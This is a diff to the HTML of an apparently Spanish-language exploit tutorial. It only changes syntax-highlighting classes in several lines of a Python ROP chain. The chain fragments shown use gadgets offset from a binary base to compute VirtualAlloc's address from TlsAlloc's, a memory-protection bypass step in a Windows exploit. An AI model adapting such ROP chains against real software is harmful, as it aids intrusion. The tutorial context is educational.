@@ -765,7 +765,7 @@ Evaluate expression: -12608 = ffffcec0</span>
 <p class="plain-text">Establecemos en <code class="language-plaintext highlighter-rouge">edi</code> el valor <code class="language-plaintext highlighter-rouge">0xffffcec0</code>, luego cargamos y desreferenciamos en <code class="language-plaintext highlighter-rouge">eax</code> la dirección de <code class="language-plaintext highlighter-rouge">TlsAlloc</code> y le sumamos el offset que guardamos antes en <code class="language-plaintext highlighter-rouge">edi</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1"># $eax = VirtualAlloc()</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="p"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0xffffcec0</span><span class="p">)</span><span class="c1">            # VirtualAlloc() - TlsAlloc()</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x9013c</span><span class="p">)</span><span class="c1"> # TlsAlloc()</span><span class="p">
@@ -833,7 +833,7 @@ rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x14af9</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
 </span><span class="c1"># $eax = VirtualAlloc()</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="p"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0xffffcec0</span><span class="p">)</span><span class="c1">            # VirtualAlloc() - TlsAlloc()</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x9013c</span><span class="p">)</span><span class="c1"> # TlsAlloc()</span><span class="p">
@@ -1004,7 +1004,7 @@ rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x0100f</span><span class="p">)</span><span class="c1"> # pop ebp; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01068</span><span class="p">)</span><span class="c1"> # pop esi; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x14af9</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
-rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="p"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
+rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x15354</span><span class="p">)</span><span class="c1"> # pop edi; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0xffffcec0</span><span class="p">)</span><span class="c1">            # VirtualAlloc() - TlsAlloc()</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x3711a</span><span class="p">)</span><span class="c1"> # pop eax; ret;</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x9013c</span><span class="p">)</span><span class="c1"> # TlsAlloc()</span><span class="p">
